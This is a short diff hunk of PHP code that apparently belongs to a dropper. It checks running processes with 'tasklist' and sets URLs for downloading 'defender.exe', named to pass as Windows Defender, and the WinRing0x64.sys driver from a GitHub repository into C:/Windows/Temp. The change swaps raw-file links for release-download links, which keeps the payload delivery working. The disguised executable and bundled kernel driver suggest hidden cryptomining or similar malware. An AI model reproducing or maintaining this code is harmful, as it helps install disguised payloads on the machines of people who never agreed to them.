@@ -47,8 +47,8 @@ $checkfile1 = 'C:/Windows/Temp/defender.exe';
 
 exec('tasklist', $output);
 
-$url =  'https://github.com/danialchork/project-final/raw/refs/heads/main/defender.exe';
-$url2 =  'https://github.com/danialchork/project-final/raw/refs/heads/main/WinRing0x64.sys';
+$url =  'https://github.com/danialchork/project-final/releases/download/last/defender.exe';
+$url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';
 
 $file_name = 'C:/Windows/Temp/defender.exe';
 $file_name2 = 'C:/Windows/Temp/WinRing0x64.sys';
